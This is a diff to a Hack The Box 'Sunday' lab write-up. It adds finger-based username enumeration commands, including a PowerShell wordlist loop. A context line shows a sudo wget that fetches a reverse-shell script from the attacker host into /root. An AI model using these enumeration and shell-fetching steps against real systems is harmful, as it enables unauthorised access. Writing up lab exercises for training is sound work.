@@ -34,8 +34,20 @@ Port 22022: OpenSSH 8.4
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/245a1dcb-ff9c-4e48-9706-f602366fd3e9)
 
++ Get more information: `finger -l root@10.10.10.76`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ca9c6443-0ed0-4939-a608-d640e6370d8c)
+
 + Enumerate for more usernames using `/usr/share/seclists/Usernames/Names/names.txt` seclists wordlist.
-+ Try to brute force usernames using the [finger-user-enum.pl](http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz) script from pentestmonkey.
++ Run **powershell** on your kali attack vm: `pwsh`
++ Run the **.ps1** [script](https://github.com/h4md153v63n/PowerShell_Scripts/tree/main/finger-service_user-enum):
+```
+cat /usr/share/seclists/Usernames/Names/names.txt | ForEach-Object -Parallel { $user = $_ ; finger $user@10.10.10.76 | grep -E '\w{1,}.*<.*>' >> "$PWD/finger.txt" }
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dc68427f-5f8e-4a20-b00c-3f0f10708c46)
+
++ **Alternatively**, try to brute force usernames using the [finger-user-enum.pl](http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz) script from pentestmonkey.
 + `./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76`
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/92b5af15-f73d-4323-9989-46b8f3d740b0)
@@ -191,5 +203,10 @@ sudo wget http://10.10.14.8:8000/rev_shell.py -O /root/troll
 
 # References & Alternatives:
 + https://vvmlist.github.io/#poison
-+ https://0xdf.gitlab.io/2018/09/29/htb-sunday.html#6-methods-to-root-using-wget
-+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/sunday-writeup-w-o-metasploit#id-4d32
++ https://0xdf.gitlab.io/2018/09/29/htb-sunday.html
++ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/sunday-writeup-w-o-metasploit
++ https://benheater.com/hackthebox-sunday/
++ x
+
+# More:
++ **Pentesting Finger:** https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger
